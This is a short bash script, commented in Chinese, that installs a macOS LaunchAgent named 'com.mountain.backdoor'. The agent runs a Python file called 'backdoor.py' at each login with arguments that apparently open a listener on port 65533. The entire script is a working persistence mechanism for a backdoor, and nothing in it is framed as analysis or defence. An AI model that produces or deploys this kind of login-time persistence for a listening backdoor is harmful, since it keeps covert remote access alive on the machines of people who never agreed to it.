#!/bin/bash

# 定义变量
PLIST_NAME="com.mountain.backdoor"
PLIST_PATH="$HOME/Library/LaunchAgents/$PLIST_NAME.plist"
SCRIPT_PATH="/Users/mountain/PycharmProjects/pythonProject/backdoor.py"

# 创建.plist文件
/bin/cat <<EOF > "$PLIST_PATH"
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>$PLIST_NAME</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/python3</string>
        <string>$SCRIPT_PATH</string>
        <string>-l</string>
        <string>-p</string>
        <string>65533</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>StandardErrorPath</key>
    <string>/tmp/$PLIST_NAME.err</string>
    <key>StandardOutPath</key>
    <string>/tmp/$PLIST_NAME.log</string>
    <key>KeepAlive</key>
    <false/>
</dict>
</plist>
EOF

# 赋予.plist文件适当的权限
chmod 644 "$PLIST_PATH"

# 输出结果
echo "Plist created at: $PLIST_PATH"
ls -l "$PLIST_PATH"
